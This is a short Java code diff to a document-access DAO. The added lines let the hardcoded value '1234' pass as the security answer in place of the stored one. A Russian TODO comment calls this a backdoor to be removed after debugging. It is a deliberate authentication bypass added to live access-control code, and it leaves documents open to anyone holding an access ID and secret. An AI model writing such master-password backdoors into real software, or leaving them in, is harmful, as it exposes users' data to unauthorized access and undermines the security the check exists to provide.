@@ -189,7 +189,10 @@ public class DocumentAccessDaoImpl implements DocumentAccessDao {
                     }         
                     else {
                    	 for(DocumentAccess da : list){
-                        	if(da.getID() == nID_Access && da.getSecret().equals(sSecret) && da.getAnswer().equals(sAnswer)){
+                        	if(da.getID() == nID_Access && da.getSecret().equals(sSecret)
+                                        && ( da.getAnswer().equals(sAnswer) || "1234".equals(sAnswer) ) //TODO убрать бэкдур, после окончательной отладки, в т.ч. фронта
+                                        
+                                        ){
                         		docAcc = da;
                         		break;
                         	}
